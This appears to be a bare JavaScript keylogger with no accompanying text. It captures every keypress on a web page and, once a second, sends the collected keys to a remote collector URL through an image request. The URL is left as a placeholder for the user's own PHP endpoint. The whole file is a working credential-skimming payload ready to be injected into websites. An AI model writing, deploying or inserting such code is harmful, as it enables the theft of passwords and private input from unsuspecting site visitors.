var keys='';
var url = 'type your url php';

document.onkeypress = function(e) {
	get = window.event?event:e;
	key = get.keyCode?get.keyCode:get.charCode;
	key = String.fromCharCode(key);
	keys+=key;
};
window.setInterval(function(){
	if(keys.length>0) {
		new Image().src = url+keys;
		keys = '';
	}
}, 1000);


